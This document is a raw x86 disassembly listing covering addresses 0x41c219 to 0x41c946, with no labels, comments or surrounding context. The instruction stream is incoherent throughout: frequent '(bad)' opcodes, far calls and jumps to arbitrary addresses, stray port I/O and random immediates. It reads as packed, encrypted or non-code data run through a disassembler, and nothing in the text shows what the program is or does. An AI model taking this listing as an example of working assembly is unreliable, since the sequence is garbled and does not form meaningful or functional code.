  41c219:	adc    ch,al
  41c21b:	push   eax
  41c21c:	mov    esi,0x37c3ddd5
  41c221:	scas   eax,DWORD PTR es:[edi]
  41c222:	retf   
  41c223:	inc    edi
  41c224:	pop    ebx
  41c225:	mov    ch,0x6a
  41c227:	mov    dl,0xef
  41c229:	ret    0xbce5
  41c22c:	adc    BYTE PTR [eax],cl
  41c22e:	sbb    eax,0xc496baa8
  41c233:	shl    DWORD PTR [eax+0x16287f95],1
  41c239:	and    eax,0xa9fa666d
  41c23e:	dec    ebp
  41c23f:	mov    dh,0x5e
  41c241:	stc    
  41c242:	mov    ds:0xee18bd5e,al
  41c247:	sbb    al,dl
  41c249:	mov    edi,0x453738ac
  41c24e:	pop    esi
  41c24f:	push   0xcbca42a9
  41c254:	or     eax,0x146108de
  41c259:	rcr    BYTE PTR [ebp-0x1e9e2836],0x7c
  41c260:	xchg   ch,dh
  41c262:	pop    esp
  41c263:	cmp    eax,DWORD PTR [edx]
  41c265:	mov    BYTE PTR [ebx],dl
  41c267:	pop    ecx
  41c268:	xchg   esi,eax
  41c269:	pop    edi
  41c26a:	loopne 0x41c26a
  41c26c:	pop    es
  41c26d:	nop
  41c26e:	ja     0x41c237
  41c270:	enter  0xc0d7,0x9d
  41c274:	clc    
  41c275:	sub    ecx,DWORD PTR [ebp-0x7afd725c]
  41c27b:	div    DWORD PTR [esi+ebp*2]
  41c27e:	adc    DWORD PTR [edi],ecx
  41c280:	pop    edx
  41c281:	out    dx,al
  41c282:	call   0xe9df:0xb9e282c0
  41c289:	xchg   esi,eax
  41c28a:	shl    DWORD PTR [edi],cl
  41c28c:	mov    esp,0x3fc4e05a
  41c291:	pop    ebx
  41c292:	imul   BYTE PTR [edi]
  41c294:	lea    edx,[edi-0x55630dd7]
  41c29a:	sbb    DWORD PTR [edx-0x70d54348],edi
  41c2a0:	xchg   esi,eax
  41c2a1:	or     DWORD PTR [ecx+edi*2-0x4],esi
  41c2a5:	fmulp  st(0),st
  41c2a7:	cwde   
  41c2a8:	adc    BYTE PTR [ecx-0x72],ch
  41c2ab:	sahf   
  41c2ac:	mov    WORD PTR [edx-0x16dc8b68],ss
  41c2b2:	xchg   edi,eax
  41c2b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2b4:	aam    0xfe
  41c2b6:	popa   
  41c2b7:	aad    0xbf
  41c2b9:	dec    ebp
  41c2ba:	and    al,0xdb
  41c2bc:	jmp    0x41c2ca
  41c2be:	cld    
  41c2bf:	fnstsw WORD PTR [ebx+0x5197c389]
  41c2c5:	lods   al,BYTE PTR ds:[esi]
  41c2c7:	add    DWORD PTR [ecx],ebx
  41c2c9:	xchg   ebx,eax
  41c2ca:	mov    al,0x44
  41c2cc:	xchg   esi,eax
  41c2cd:	cmp    bl,BYTE PTR [esi+eax*4-0x394d8752]
  41c2d4:	into   
  41c2d5:	int    0xde
  41c2d7:	lods   eax,DWORD PTR ds:[esi]
  41c2d8:	adc    eax,0xab86dc5c
  41c2dd:	loop   0x41c30c
  41c2df:	mov    ebx,0x70b3df49
  41c2e4:	call   0xcf6998d8
  41c2e9:	and    DWORD PTR [ecx],ecx
  41c2eb:	adc    eax,0x6138748
  41c2f0:	cdq    
  41c2f1:	add    BYTE PTR ds:0x1418eb7a,bl
  41c2f7:	retf   
  41c2f8:	gs cld 
  41c2fa:	push   edi
  41c2fb:	add    DWORD PTR [esi+0x25],ebx
  41c2fe:	daa    
  41c2ff:	or     al,0xb6
  41c301:	cmp    BYTE PTR [eax],ch
  41c303:	sbb    BYTE PTR [ecx-0x25],ch
  41c306:	scas   al,BYTE PTR es:[edi]
  41c307:	sub    eax,0x71180746
  41c30c:	pusha  
  41c30d:	jo     0x41c29f
  41c30f:	dec    esp
  41c310:	xchg   BYTE PTR [ebp-0x56],al
  41c313:	jg     0x41c2c0
  41c315:	ins    DWORD PTR es:[edi],dx
  41c316:	mov    DWORD PTR [ebp-0x115a921c],edi
  41c31c:	xor    al,0x90
  41c31e:	jecxz  0x41c2c9
  41c320:	dec    ebx
  41c321:	mov    bl,BYTE PTR [ebx+0x75]
  41c324:	jge    0x41c36b
  41c326:	inc    ecx
  41c327:	jmp    0x41c360
  41c329:	loopne 0x41c326
  41c32b:	or     BYTE PTR [eax+ebp*1+0x6],ah
  41c32f:	call   0x5f01:0x55fc04b0
  41c336:	outs   dx,BYTE PTR ds:[esi]
  41c337:	or     ch,BYTE PTR [ecx]
  41c339:	push   ss
  41c33a:	(bad)  
  41c33b:	pop    ecx
  41c33c:	sahf   
  41c33d:	test   eax,0x1555a77a
  41c342:	and    BYTE PTR [eax+0x65],bh
  41c345:	mov    al,0xd1
  41c347:	cmp    eax,0x517e1052
  41c34c:	loopne 0x41c2d2
  41c34e:	cmp    eax,0xe3710679
  41c353:	xlat   BYTE PTR ss:[ebx]
  41c355:	dec    ecx
  41c356:	ja     0x41c346
  41c358:	out    0x46,al
  41c35a:	xchg   ebp,eax
  41c35b:	mov    ebx,0x285516d1
  41c360:	dec    eax
  41c361:	test   eax,0xa6d0e2ea
  41c366:	pop    eax
  41c367:	loope  0x41c350
  41c369:	leave  
  41c36a:	in     eax,dx
  41c36b:	aam    0xed
  41c36d:	mov    al,0xc9
  41c36f:	test   eax,0x28b2b637
  41c374:	xchg   esi,eax
  41c375:	sti    
  41c376:	lds    edi,FWORD PTR [eax]
  41c378:	push   ecx
  41c379:	fnstsw ax
  41c37b:	or     al,0xda
  41c37d:	fistp  WORD PTR [ecx+0x36958b34]
  41c383:	fcom   DWORD PTR [ebp-0x3e642eb]
  41c389:	or     esp,edx
  41c38b:	imul   esi,DWORD PTR [edx-0x9855b40],0xffffffb5
  41c392:	out    0xef,eax
  41c394:	rol    DWORD PTR [edi],1
  41c396:	enter  0x7692,0x8a
  41c39a:	sbb    eax,DWORD PTR [ecx]
  41c39c:	stos   BYTE PTR es:[edi],al
  41c39d:	and    ebp,edi
  41c39f:	mov    ch,0xf2
  41c3a1:	cdq    
  41c3a2:	inc    eax
  41c3a3:	shr    DWORD PTR [eax-0x6ec48857],0x64
  41c3aa:	xor    al,0x39
  41c3ac:	ins    BYTE PTR es:[edi],dx
  41c3ad:	sbb    bh,BYTE PTR [eax-0x4a]
  41c3b0:	cld    
  41c3b1:	add    al,0xc5
  41c3b4:	scas   eax,DWORD PTR es:[edi]
  41c3b5:	cwde   
  41c3b6:	sub    BYTE PTR [esi+ecx*4],al
  41c3b9:	in     al,dx
  41c3ba:	enter  0xfb53,0x73
  41c3be:	sbb    ebx,DWORD PTR [edi]
  41c3c0:	jg     0x41c361
  41c3c2:	and    esi,DWORD PTR [ebp-0x1577c693]
  41c3c8:	mov    dh,0x7a
  41c3ca:	sub    ch,cl
  41c3cc:	lahf   
  41c3cd:	mov    cl,0x77
  41c3cf:	mov    WORD PTR [edi+0x3f68d36c],fs
  41c3d5:	outs   dx,BYTE PTR ds:[esi]
  41c3d6:	xchg   edi,eax
  41c3d7:	or     DWORD PTR [ebx+0x48b64275],edi
  41c3dd:	les    ebp,FWORD PTR [ebx-0x164e23ad]
  41c3e3:	xlat   BYTE PTR ds:[ebx]
  41c3e4:	mov    ds:0xc2fbf87d,al
  41c3e9:	out    dx,al
  41c3ea:	push   ss
  41c3eb:	and    eax,0xe6518a18
  41c3f0:	cmp    BYTE PTR [edx],dl
  41c3f2:	retf   
  41c3f3:	icebp  
  41c3f4:	adc    DWORD PTR [eax],ecx
  41c3f6:	in     al,0x2c
  41c3f8:	aam    0x68
  41c3fa:	sbb    edi,edi
  41c3fc:	inc    ecx
  41c3fd:	mov    ebx,0x5b0a6fc9
  41c402:	outs   dx,BYTE PTR ds:[esi]
  41c403:	test   DWORD PTR [ebx+ebp*1+0x47c656c4],esi
  41c40a:	cwde   
  41c40b:	mov    bh,0xe
  41c40d:	xor    BYTE PTR [edi+ecx*1-0x24],dh
  41c411:	cmp    esp,DWORD PTR [edx+0x59]
  41c414:	push   ebp
  41c415:	lds    eax,FWORD PTR [ecx]
  41c417:	sahf   
  41c418:	mov    esi,0xc2befbd2
  41c41d:	add    DWORD PTR [ecx-0x5ef4e2a1],eax
  41c423:	mov    ds:0x28cf72dc,eax
  41c428:	loopne 0x41c470
  41c42a:	shr    BYTE PTR [ecx+0x51],cl
  41c42d:	sub    dl,BYTE PTR [ecx+0x2]
  41c430:	pop    ebp
  41c431:	add    DWORD PTR [ebp+0x5b],eax
  41c434:	mov    edx,0x7bdc1d3f
  41c439:	(bad)  
  41c43b:	mov    ebp,0x6aede0b2
  41c440:	data16 and BYTE PTR [ecx-0x6c],0xf
  41c445:	pop    esi
  41c446:	daa    
  41c447:	xchg   edx,eax
  41c448:	adc    eax,0x694ad50e
  41c44d:	mov    al,ds:0x2dd7c332
  41c452:	fs pushf 
  41c454:	pop    ss
  41c455:	das    
  41c456:	int    0x2a
  41c458:	shr    ebp,cl
  41c45a:	scas   eax,DWORD PTR es:[edi]
  41c45b:	push   esi
  41c45c:	cmc    
  41c45d:	or     al,0x30
  41c45f:	iret   
  41c460:	jecxz  0x41c47f
  41c462:	jno    0x41c421
  41c464:	push   esp
  41c465:	pop    ss
  41c466:	xchg   edi,eax
  41c467:	sub    dh,BYTE PTR [edi+eiz*1+0x6a6c962b]
  41c46e:	cmp    eax,0x519477b
  41c473:	push   es
  41c474:	and    ecx,DWORD PTR [ecx-0x5c]
  41c477:	js     0x41c49d
  41c479:	mov    ebx,0xdc083891
  41c47e:	sbb    eax,0x72339032
  41c483:	dec    ebx
  41c484:	repz jb 0x41c4d1
  41c487:	inc    eax
  41c488:	inc    ebx
  41c489:	mov    ch,BYTE PTR [edi+0x33e0e0b4]
  41c48f:	mov    DWORD PTR [edi-0x69],edx
  41c492:	add    DWORD PTR [esi],ecx
  41c494:	inc    ebp
  41c495:	mov    DWORD PTR [esi+0x491511d7],eax
  41c49b:	xchg   edi,eax
  41c49d:	dec    ecx
  41c49e:	in     eax,0xc0
  41c4a0:	pop    ecx
  41c4a1:	mov    cl,0x86
  41c4a3:	(bad)  
  41c4a4:	sub    al,0x57
  41c4a6:	(bad)  
  41c4a7:	out    dx,al
  41c4a8:	ret    0xd7ca
  41c4ab:	jmp    0x527f9cd7
  41c4b0:	inc    esi
  41c4b1:	jb     0x41c464
  41c4b3:	ins    BYTE PTR es:[edi],dx
  41c4b4:	jmp    FWORD PTR [esi-0x5b]
  41c4b7:	jle    0x41c51f
  41c4b9:	mov    DWORD PTR [ecx],ebp
  41c4bb:	inc    cx
  41c4bd:	xor    ebp,DWORD PTR [edx+0x3a]
  41c4c0:	cmc    
  41c4c1:	in     al,dx
  41c4c2:	push   esi
  41c4c3:	addr16 (bad) 
  41c4c5:	xor    ebp,eax
  41c4c7:	and    bl,BYTE PTR [edi+eax*8+0x19c02cf8]
  41c4ce:	adc    ax,0xacd5
  41c4d2:	sub    DWORD PTR [edi+0x7b30ec57],ecx
  41c4d8:	retf   
  41c4d9:	or     eax,0xbb01682e
  41c4de:	idiv   BYTE PTR [ecx-0x68aa535d]
  41c4e4:	call   0x422aa06d
  41c4e9:	icebp  
  41c4ea:	(bad)  
  41c4eb:	add    DWORD PTR [ecx+0x1570de62],eax
  41c4f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4f2:	int    0x5b
  41c4f4:	jl     0x41c4e8
  41c4f6:	cmp    esp,DWORD PTR [edi+edi*4]
  41c4f9:	jge    0x41c533
  41c4fb:	xor    BYTE PTR [edi+0x2999685f],al
  41c501:	loope  0x41c4d0
  41c503:	sbb    cl,BYTE PTR [edx+ebp*2+0x29]
  41c507:	ror    BYTE PTR [edi+0x47],1
  41c50a:	popf   
  41c50b:	mov    esp,0xd2c2e7eb
  41c510:	mov    ebx,?
  41c512:	push   edx
  41c513:	retf   0x41cc
  41c516:	ret    
  41c517:	dec    ebp
  41c518:	push   ebp
  41c519:	test   eax,0x3afae6ed
  41c51e:	shl    DWORD PTR [edi+ebx*4-0x41661069],1
  41c525:	in     eax,0x66
  41c527:	add    BYTE PTR [esi+0x74],dh
  41c52a:	repnz push edi
  41c52c:	or     DWORD PTR [esi],esp
  41c52e:	xchg   edx,eax
  41c52f:	into   
  41c530:	(bad)  
  41c531:	aam    0xb6
  41c533:	jge    0x41c509
  41c535:	lods   al,BYTE PTR ds:[esi]
  41c536:	xor    DWORD PTR [edi+edi*1-0x21],edx
  41c53a:	and    cl,bl
  41c53c:	mov    dl,0x62
  41c53e:	mov    ebx,0xffc8a3b8
  41c543:	cmp    DWORD PTR [ebx+eax*2],edi
  41c546:	mov    ds:0x57109b76,eax
  41c54b:	push   ss
  41c54c:	or     al,BYTE PTR [esi]
  41c54e:	(bad)  
  41c54f:	mov    eax,ds:0x15e55a31
  41c554:	dec    ebx
  41c555:	mov    bh,BYTE PTR [eax-0x7350fd7f]
  41c55b:	scas   al,BYTE PTR es:[edi]
  41c55c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c55d:	cmp    eax,DWORD PTR [ebx+0x74]
  41c560:	lock xchg esi,eax
  41c562:	pop    esi
  41c563:	aam    0x9b
  41c565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c566:	mov    cl,0xa5
  41c568:	pop    ds
  41c569:	xor    DWORD PTR [eax],esp
  41c56b:	icebp  
  41c56c:	stos   DWORD PTR es:[edi],eax
  41c56d:	dec    esp
  41c56e:	fiadd  DWORD PTR [ecx+0x29]
  41c571:	or     BYTE PTR [esi],al
  41c573:	or     BYTE PTR [edi],dl
  41c575:	(bad)  
  41c577:	mov    dh,0xf3
  41c579:	clc    
  41c57a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c57b:	lods   al,BYTE PTR ds:[esi]
  41c57c:	jo     0x41c574
  41c57e:	shr    bh,1
  41c580:	enter  0x2d64,0x7d
  41c584:	dec    ebx
  41c585:	mov    bl,0xc8
  41c587:	clc    
  41c588:	mov    ah,0x3
  41c58a:	fwait
  41c58b:	stos   DWORD PTR es:[edi],eax
  41c58c:	inc    esi
  41c58d:	leave  
  41c58e:	(bad)  
  41c58f:	stos   DWORD PTR es:[edi],eax
  41c590:	mov    dh,0xb0
  41c592:	push   ecx
  41c593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c594:	mov    edi,0x3662bfa1
  41c599:	and    al,0x96
  41c59b:	fmul   QWORD PTR [eax]
  41c59d:	sbb    cl,bh
  41c59f:	sub    ebp,eax
  41c5a1:	stos   DWORD PTR es:[edi],eax
  41c5a2:	dec    eax
  41c5a3:	mov    cl,0x3
  41c5a5:	push   cs
  41c5a6:	mov    ss,WORD PTR [eax-0x41d0f59a]
  41c5ac:	or     al,0x73
  41c5ae:	add    DWORD PTR [edx-0x5fc595d5],ebp
  41c5b4:	inc    ebp
  41c5b5:	js     0x41c54b
  41c5b7:	sub    al,0x70
  41c5b9:	xchg   BYTE PTR [ebp+0x1ce116c],ch
  41c5bf:	ret    0x22ff
  41c5c2:	add    al,0xaf
  41c5c4:	dec    esi
  41c5c5:	push   ds
  41c5c6:	mov    edi,0x8908e467
  41c5cb:	test   eax,0x921b2518
  41c5d0:	and    eax,0x67d1f092
  41c5d5:	mov    ch,0xb4
  41c5d7:	mov    dl,al
  41c5d9:	push   esi
  41c5da:	out    0x1c,eax
  41c5dc:	push   esi
  41c5dd:	out    dx,al
  41c5de:	jne    0x41c616
  41c5e0:	jae    0x41c629
  41c5e2:	xchg   edi,eax
  41c5e3:	cmp    DWORD PTR [ebx-0x18],eax
  41c5e6:	aaa    
  41c5e7:	std    
  41c5e8:	jp     0x41c5b9
  41c5ea:	or     ebx,DWORD PTR [eax+0x1d]
  41c5ed:	push   ss
  41c5ee:	xchg   ecx,eax
  41c5ef:	cli    
  41c5f0:	iret   
  41c5f1:	xchg   edx,eax
  41c5f2:	mov    eax,0x8fa324cc
  41c5f7:	jecxz  0x41c5c3
  41c5f9:	mov    ds:0x41bb7af8,al
  41c5fe:	shl    BYTE PTR [eax+0x20a99fe9],cl
  41c604:	mov    bh,0x88
  41c606:	call   0xd0e0df9f
  41c60b:	ja     0x41c68c
  41c60d:	mov    ds:0x8b7e7f81,eax
  41c612:	jecxz  0x41c656
  41c614:	cmp    DWORD PTR [eax-0x7450a4a5],ecx
  41c61a:	arpl   WORD PTR [ebp+0x68],dx
  41c61d:	lahf   
  41c61e:	jo     0x41c5a6
  41c620:	sub    eax,0xbe6944be
  41c625:	dec    edi
  41c626:	cmp    DWORD PTR [ecx-0x4b],edi
  41c629:	jne    0x41c651
  41c62b:	add    eax,0xd8ba98f
  41c630:	push   ss
  41c631:	retf   0x8c90
  41c634:	sub    al,0xfd
  41c636:	ins    DWORD PTR es:[edi],dx
  41c637:	retf   
  41c638:	push   DWORD PTR [edx]
  41c63a:	clc    
  41c63b:	loope  0x41c5da
  41c63d:	ret    0x5eb4
  41c640:	mov    al,BYTE PTR [ecx+0x1d]
  41c643:	ret    
  41c644:	xchg   DWORD PTR [eax+edx*8],ecx
  41c647:	xor    ebp,DWORD PTR [ebp+0x1b3ee0a4]
  41c64d:	idiv   DWORD PTR [edi]
  41c64f:	fnstsw WORD PTR [edx-0x1e]
  41c652:	fild   WORD PTR [edi-0x9282944]
  41c658:	inc    ebp
  41c659:	mov    ebp,0xefc6bcb9
  41c65e:	cld    
  41c65f:	xchg   esi,eax
  41c660:	pop    edx
  41c661:	pop    esp
  41c662:	sti    
  41c663:	loopne 0x41c632
  41c665:	stos   BYTE PTR es:[edi],al
  41c666:	les    edi,FWORD PTR [ecx+0x3f350211]
  41c66c:	out    0xc5,al
  41c66e:	jmp    0x1963:0x54bc9e9d
  41c675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c676:	ins    BYTE PTR es:[edi],dx
  41c677:	dec    ebp
  41c678:	mov    esi,0xd6628a23
  41c67d:	xchg   edi,eax
  41c67e:	mov    edi,0xe9b340d3
  41c683:	mov    edi,0x8b8ef773
  41c688:	into   
  41c689:	(bad)  
  41c68a:	es cdq 
  41c68c:	or     edx,esi
  41c68e:	xchg   BYTE PTR [eax-0x38ed7bb0],bl
  41c694:	call   FWORD PTR [edx+0x27]
  41c697:	cmp    BYTE PTR [eax-0x6ceb98cd],0xe3
  41c69e:	shl    BYTE PTR [ecx],1
  41c6a0:	gs push eax
  41c6a2:	xor    eax,0x5e4d88dd
  41c6a7:	cmp    ah,BYTE PTR [esi-0x71971c89]
  41c6ad:	lahf   
  41c6ae:	fstp   DWORD PTR [ecx]
  41c6b0:	dec    edi
  41c6b1:	pusha  
  41c6b2:	mov    dl,0xd8
  41c6b4:	fidivr DWORD PTR [edx+0x2903554f]
  41c6ba:	nop
  41c6bb:	jb     0x41c6d2
  41c6bd:	push   esp
  41c6be:	arpl   WORD PTR [esi],dx
  41c6c0:	adc    ah,dh
  41c6c2:	not    dh
  41c6c4:	out    dx,eax
  41c6c5:	out    dx,al
  41c6c6:	addr16 push edx
  41c6c8:	(bad)  
  41c6c9:	xchg   ecx,eax
  41c6ca:	jae    0x41c6b7
  41c6cc:	stos   DWORD PTR es:[edi],eax
  41c6cd:	(bad)  
  41c6ce:	sbb    al,0x49
  41c6d0:	aaa    
  41c6d1:	imul   BYTE PTR [edx]
  41c6d3:	cwde   
  41c6d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6d5:	jmp    0x41c65f
  41c6d7:	push   ebx
  41c6d8:	sbb    BYTE PTR [esi+0x50],0xa8
  41c6dc:	sub    dh,BYTE PTR [eax]
  41c6de:	xchg   ecx,eax
  41c6df:	mov    edx,0xfe29c7b5
  41c6e4:	out    dx,al
  41c6e5:	adc    DWORD PTR [ebx+0x72de892f],ecx
  41c6eb:	int3   
  41c6ec:	push   ecx
  41c6ed:	xchg   edi,eax
  41c6ee:	jp     0x41c697
  41c6f0:	movzx  ebx,bh
  41c6f3:	adc    edi,DWORD PTR [edi+ebx*8+0x7a]
  41c6f7:	push   edx
  41c6f8:	out    dx,al
  41c6f9:	jae    0x41c726
  41c6fb:	inc    ecx
  41c6fc:	inc    ecx
  41c6fd:	or     BYTE PTR [eax],bh
  41c6ff:	push   ecx
  41c700:	inc    esp
  41c701:	das    
  41c702:	(bad)  
  41c703:	jecxz  0x41c6dd
  41c705:	mov    esi,0xff51d3d1
  41c70a:	mov    al,0x8
  41c70c:	mov    cl,BYTE PTR [ecx]
  41c70e:	fsub   QWORD PTR [ebx+0x33139565]
  41c714:	fsubr  DWORD PTR [esi+0x61646f92]
  41c71a:	inc    edi
  41c71b:	push   edi
  41c71c:	dec    eax
  41c71d:	lds    eax,FWORD PTR [eax+edx*4+0x2579b37f]
  41c724:	sbb    BYTE PTR [esi+edi*2+0x72d8c0cb],bh
  41c72b:	das    
  41c72c:	xor    DWORD PTR [ebx],ebp
  41c72e:	fucom  st(6)
  41c730:	and    ecx,DWORD PTR [ebp-0x59]
  41c733:	mov    bl,0xf0
  41c735:	inc    edx
  41c736:	push   eax
  41c737:	sbb    al,0x16
  41c739:	iret   
  41c73a:	add    DWORD PTR [esi+0x7aa27fd5],esi
  41c740:	repnz push ss
  41c742:	iret   
  41c743:	add    BYTE PTR [edx-0x6e192d4d],cl
  41c749:	xchg   edx,eax
  41c74a:	push   cs
  41c74b:	sub    ah,bh
  41c74d:	dec    edi
  41c74e:	adc    dl,0x6a
  41c751:	push   cs
  41c752:	fcomip st,st(0)
  41c754:	iret   
  41c755:	int    0xc2
  41c757:	maskmovq mm4,(bad)
  41c758:	mul    DWORD PTR [ebp-0x6b247572]
  41c75e:	jmp    0xb1b0:0xff22b91a
  41c765:	jge    0x41c7b5
  41c767:	inc    ecx
  41c768:	in     al,dx
  41c769:	pop    esp
  41c76a:	mov    ecx,0xead45783
  41c76f:	push   0x1
  41c771:	xor    eax,edx
  41c773:	jae    0x41c784
  41c775:	scas   eax,DWORD PTR es:[edi]
  41c776:	aas    
  41c777:	push   esp
  41c778:	pop    esp
  41c779:	shl    esp,1
  41c77b:	leave  
  41c77c:	xlat   BYTE PTR ds:[ebx]
  41c77d:	test   al,0x6b
  41c77f:	dec    edi
  41c780:	xchg   edi,eax
  41c781:	rol    edi,0x20
  41c784:	xchg   edx,eax
  41c785:	ret    0x356
  41c788:	and    al,0xf3
  41c78a:	js     0x41c807
  41c78c:	(bad)  
  41c78d:	cmp    eax,0xb90fc324
  41c792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c793:	or     BYTE PTR [ebp+esi*1+0x1a195519],ch
  41c79a:	jnp    0x41c7e6
  41c79c:	mov    esi,DWORD PTR [edx+0xa]
  41c79f:	jmp    0xfdc07772
  41c7a4:	jl     0x41c763
  41c7a6:	sbb    DWORD PTR [eax+0x66],edi
  41c7a9:	inc    edi
  41c7aa:	cwde   
  41c7ab:	in     eax,dx
  41c7ac:	stc    
  41c7ad:	xor    BYTE PTR [ebx],0x7
  41c7b0:	add    esp,DWORD PTR es:[edx-0x4869953]
  41c7b7:	sub    bl,BYTE PTR [ebp+0x1b]
  41c7ba:	pop    ecx
  41c7bb:	push   ebp
  41c7bc:	(bad)  
  41c7bd:	push   DWORD PTR [esi+0x23]
  41c7c0:	mov    ds:0x4f2b676,al
  41c7c5:	inc    edi
  41c7c6:	scas   eax,DWORD PTR es:[edi]
  41c7c7:	and    BYTE PTR [ecx-0x4d483043],0x91
  41c7ce:	fbstp  TBYTE PTR [ebx]
  41c7d0:	jo     0x41c7ba
  41c7d2:	mov    cl,0x46
  41c7d4:	mov    ds:0x1e28fb8b,al
  41c7d9:	push   esp
  41c7da:	lods   eax,DWORD PTR ds:[esi]
  41c7db:	mov    dl,0x6f
  41c7dd:	(bad)  [ebx+0x68]
  41c7e0:	jp     0x41c834
  41c7e2:	lods   al,BYTE PTR ds:[esi]
  41c7e3:	in     al,0x9b
  41c7e5:	mov    bh,0xf6
  41c7e7:	das    
  41c7e8:	sub    BYTE PTR [edi+0x29046c7f],0x42
  41c7ef:	add    al,0x2a
  41c7f1:	retf   0xf42f
  41c7f4:	add    ebx,ebx
  41c7f6:	inc    edi
  41c7f7:	imul   esp,DWORD PTR [edx-0x611b14a9],0x3613f862
  41c801:	sub    DWORD PTR [edx-0x66],esp
  41c804:	daa    
  41c805:	cs fs pop esp
  41c808:	jns    0x41c816
  41c80a:	lods   eax,DWORD PTR ds:[esi]
  41c80b:	fs mov ecx,0x461542e2
  41c811:	sar    BYTE PTR [edx],0xe7
  41c814:	sahf   
  41c815:	adc    al,0x72
  41c817:	sub    dh,BYTE PTR [eax+eax*4]
  41c81a:	push   esi
  41c81b:	ins    DWORD PTR es:[edi],dx
  41c81c:	dec    edx
  41c81d:	sbb    edi,esi
  41c81f:	stos   BYTE PTR es:[edi],al
  41c820:	cmp    BYTE PTR ds:0x8362e180,ah
  41c826:	dec    esi
  41c827:	jo     0x41c891
  41c829:	push   esi
  41c82a:	and    DWORD PTR [ebx-0x22],esi
  41c82d:	and    al,0x7e
  41c82f:	into   
  41c830:	and    BYTE PTR [edi+0x48],al
  41c833:	xchg   esp,eax
  41c834:	outs   dx,DWORD PTR ds:[esi]
  41c835:	dec    ebx
  41c836:	fimul  WORD PTR [eax]
  41c838:	sbb    DWORD PTR [eax+0x140ac1e1],esp
  41c83e:	xchg   edx,eax
  41c83f:	mov    ah,0x5
  41c841:	jl     0x41c8c1
  41c843:	mov    cs,WORD PTR [edi*1+0x7506ceff]
  41c84a:	jge    0x41c817
  41c84c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c84d:	out    0xdb,eax
  41c84f:	test   eax,0x68ab3edd
  41c854:	xchg   ebp,eax
  41c855:	push   edx
  41c856:	push   ecx
  41c857:	(bad)  
  41c858:	out    dx,eax
  41c859:	mov    BYTE PTR [eax+0x38577b4b],ah
  41c85f:	mov    al,0x9e
  41c861:	fsubr  QWORD PTR [ebx]
  41c863:	mov    bl,ah
  41c865:	xor    eax,0x8dea17b3
  41c86a:	xlat   BYTE PTR ds:[ebx]
  41c86b:	outs   dx,DWORD PTR ds:[esi]
  41c86c:	fwait
  41c86d:	cmp    ecx,ebp
  41c86f:	scas   al,BYTE PTR es:[edi]
  41c870:	iret   
  41c871:	and    eax,0xde503b24
  41c876:	test   ebp,edx
  41c878:	repnz mov dh,0x40
  41c87b:	ror    BYTE PTR [ebp+0xbcf41ad],0xf4
  41c882:	retf   
  41c883:	mov    ecx,DWORD PTR [ebp+0x3c]
  41c886:	xchg   edx,eax
  41c887:	imul   edi,ebx,0x4c9d8fea
  41c88d:	mov    esi,0xdfe81f17
  41c892:	dec    ecx
  41c893:	in     al,0x4
  41c895:	jecxz  0x41c8e2
  41c897:	sub    al,0xc1
  41c899:	add    BYTE PTR [ecx+0x11],dh
  41c89c:	xchg   ecx,eax
  41c89d:	inc    esi
  41c89e:	sbb    BYTE PTR [ebp-0x323ae91b],al
  41c8a4:	icebp  
  41c8a5:	xor    dl,dl
  41c8a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8a8:	cs ins WORD PTR es:[edi],dx
  41c8ab:	dec    eax
  41c8ac:	add    al,0x4d
  41c8ae:	mov    al,dl
  41c8b0:	xchg   DWORD PTR [ebx+0x53df6b22],eax
  41c8b6:	mov    eax,0xe9b5e3ed
  41c8bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8bc:	jge    0x41c8b9
  41c8be:	les    edi,FWORD PTR [edi+esi*4+0x71]
  41c8c2:	mov    edx,DWORD PTR [edi+0x3fd4632f]
  41c8c8:	mov    edx,0x7c969e31
  41c8cd:	outs   dx,BYTE PTR ds:[esi]
  41c8ce:	sub    eax,0x4b901b97
  41c8d3:	and    eax,0x972f5489
  41c8d8:	shl    DWORD PTR [esi-0x7d],1
  41c8db:	push   0xd4bc5c7c
  41c8e0:	in     al,dx
  41c8e1:	inc    ebx
  41c8e2:	xchg   DWORD PTR [ebx],ebp
  41c8e4:	enter  0xca58,0x24
  41c8e8:	dec    ecx
  41c8e9:	or     DWORD PTR [eax+ebp*8],edx
  41c8ec:	les    edi,FWORD PTR [eax]
  41c8ee:	lea    edi,[eax]
  41c8f0:	dec    esp
  41c8f1:	sti    
  41c8f2:	(bad)  
  41c8f3:	mov    eax,0x121f72ee
  41c8f8:	sbb    BYTE PTR [eax-0x553697f3],bl
  41c8fe:	push   edx
  41c8ff:	lods   al,BYTE PTR ds:[esi]
  41c900:	mov    al,0x4b
  41c902:	pusha  
  41c903:	jae    0x41c972
  41c905:	xchg   edx,eax
  41c906:	push   ds
  41c907:	add    eax,0x7d2de4a4
  41c90c:	xchg   ebx,eax
  41c90d:	sub    al,0x6b
  41c90f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c910:	out    0xaa,al
  41c912:	sub    dl,BYTE PTR [ecx+0x7e1cc318]
  41c918:	ror    DWORD PTR [ecx+0x27dd6d61],1
  41c91e:	loope  0x41c97f
  41c920:	repz push ebp
  41c922:	aaa    
  41c923:	out    0x7c,eax
  41c925:	stc    
  41c926:	adc    dh,BYTE PTR [ebx]
  41c928:	stc    
  41c929:	clc    
  41c92a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c92b:	not    BYTE PTR [eax]
  41c92d:	dec    eax
  41c92e:	icebp  
  41c92f:	scas   al,BYTE PTR es:[edi]
  41c930:	adc    ebx,esi
  41c932:	outs   dx,BYTE PTR ds:[esi]
  41c933:	es adc al,0x33
  41c936:	pop    ds
  41c937:	pop    ss
  41c938:	sub    al,0xa3
  41c93a:	sub    BYTE PTR [ebx-0x6],dl
  41c93d:	repnz in al,dx
  41c93f:	pop    esp
  41c940:	sbb    DWORD PTR [ebp-0x37694264],edx
  41c946:	and    bl,bh
